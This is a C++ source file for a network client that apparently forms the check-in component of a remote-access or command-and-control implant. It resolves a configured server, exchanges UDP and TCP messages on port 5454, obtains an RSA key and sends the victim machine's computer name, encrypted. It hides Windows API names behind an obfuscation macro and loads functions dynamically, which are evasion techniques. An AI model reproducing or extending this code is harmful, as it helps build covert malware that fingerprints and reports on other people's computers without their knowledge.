#include "client.h"
#include "External/obfuscate.h"
#include "procutils.h"
#include "serialization.h"

Client::Client() {
	NetCommon::LoadWSAFunctions();

	// setup udp addr

	hostent* host = GetHostByName(DNS_NAME.c_str());
	if ( host == NULL )
		return;

	sockaddr_in addr;
	memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);
	addr.sin_family = AF_INET;
	addr.sin_port = HostToNetworkShort(5454);

	// set udp server info
	this->UDPServerDetails.addr = addr;
	this->UDPServerDetails.domain = AF_INET;
	this->UDPServerDetails.port = 5454;
	this->UDPServerDetails.type = SOCK_DGRAM;
}

Client::~Client() {
	this->Disconnect(); // disconnect incase the socket is still connected

	CleanWSA();
	ProcessUtilities::FreeUsedLibrary(winsock32);
}

void Client::InsertComputerName() {
	using namespace ProcessUtilities;
	char  buffer[256];
	DWORD buffSize = sizeof(buffer);

	// get computer name
	BOOL success = GetFunctionAddress<PPROCFN::_GetComputerNameA>(
		GetLoadedLib(freqDLLS::kernel32),
		std::string(HIDE("GetComputerNameA")))( buffer, &buffSize );

	if ( success )
		this->ComputerName = buffer;
}

BOOL Client::Connect() {
	// make request to udp server
	this->UDPSocket = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if ( this->UDPSocket == INVALID_SOCKET )
		return FALSE;

	ClientRequest request(ClientRequest::CONNECT_CLIENT, 0, this->UDPSocket);

	BOOL validServerResponse = SendMessageToServer(this->UDPServerDetails, request, this->UDPServerDetails.addr);
	if ( !validServerResponse )
		return FALSE;  

	UDPResponse response;
	sockaddr_in serverAddr;
	BOOL received = ReceiveMessageFromServer(this->UDPServerDetails, response, serverAddr);
	if ( !received )
		return FALSE;

	this->UDPServerDetails.addr = serverAddr;
	this->TCPServerDetails = response.TCPServer;

	// connect to tcp server
	this->TCPSocket = CreateSocket(AF_INET, SOCK_STREAM, 0);
	if ( this->TCPSocket == INVALID_SOCKET )
		return FALSE;

	int connect = ConnectSocket(this->TCPSocket, ( sockaddr* ) &this->TCPServerDetails.addr, sizeof(this->TCPServerDetails.addr));
	if ( connect == SOCKET_ERROR )
		return FALSE;

	GetPublicRSAKeyFromServer();
	return TRUE;
}

BYTESTRING Client::MakeTCPRequest(ClientRequest req, BOOL encrypted) {

	BOOL sent = encrypted ? SendEncryptedMessageToServer(this->TCPServerDetails, req) : SendMessageToServer(this->TCPServerDetails, req);
	if ( !sent ) return {};

	BYTESTRING serverResponse;
	BOOL received = NetCommon::ReceiveData(serverResponse, this->TCPSocket, TCP, NetCommon::_default, encrypted, NetCommon::GetBIOFromString(this->Secrets.strPublicKey));
	if ( !received ) return {};

	return serverResponse;
}

BOOL Client::SendComputerNameToServer() {
	InsertComputerName();
	BYTESTRING computerName = Serialization::SerializeString(this->ComputerName);

	BIO* key = NetCommon::GetBIOFromString(this->Secrets.strPublicKey);
	BOOL success = NetCommon::TransmitData(computerName, this->TCPSocket, TCP, NetCommon::_default, TRUE, key, FALSE);
	BIO_free(key);
	return success;
}

BOOL Client::GetPublicRSAKeyFromServer() {
	ClientRequest request(ClientRequest::REQUEST_PUBLIC_ENCRYPTION_KEY, this->TCPSocket);

	// receive the rsa public key
	BYTESTRING serialized = MakeTCPRequest(request);
	
	// the base64 encoded ras key
	std::string base64 = Serialization::BytestringToString(serialized);
	std::string bio = "";
	macaron::Base64::Decode(base64, bio);
	
	this->Secrets.strPublicKey = bio;
	MessageBoxA(NULL, bio.c_str(), "", MB_OK);

	return !this->Secrets.strPublicKey.empty();
}

template <typename _Ty>
BOOL Client::ReceiveMessageFromServer(Server who, _Ty& out, sockaddr_in& outAddr) {
	if ( who.type == SOCK_STREAM )
		return NetCommon::ReceiveData(out, this->TCPSocket, TCP);
	else if ( who.type == SOCK_DGRAM )
		return NetCommon::ReceiveData(out, this->UDPSocket, UDP, outAddr);
	
	return FALSE;
}

BOOL Client::SendMessageToServer(Server dest, ClientMessage message, sockaddr_in udpAddr) {
	if ( dest.type == SOCK_STREAM ) // tcp
		return NetCommon::TransmitData(message, this->TCPSocket, TCP);
	else if ( dest.type == SOCK_DGRAM ) // udp
		return NetCommon::TransmitData(message, this->UDPSocket, UDP, udpAddr);

	return FALSE;
}

BOOL Client::SendEncryptedMessageToServer(Server dest, ClientMessage message) {
	BIO* pk = NetCommon::GetBIOFromString(this->Secrets.strPublicKey);
	BOOL success = FALSE;
	if ( dest.type == SOCK_STREAM ) // tcp
		success = NetCommon::TransmitData(message, this->TCPSocket, TCP, NetCommon::_default, TRUE, pk, FALSE);
	else if ( dest.type == SOCK_DGRAM ) // udp
		success = NetCommon::TransmitData(message, this->UDPSocket, UDP, dest.addr, TRUE, pk, FALSE);

	return success;
}

BOOL Client::Disconnect() {
	int status = CloseSocket(this->TCPSocket);
	if ( status == SOCKET_ERROR ) {
		return FALSE;
	}

	return TRUE;
}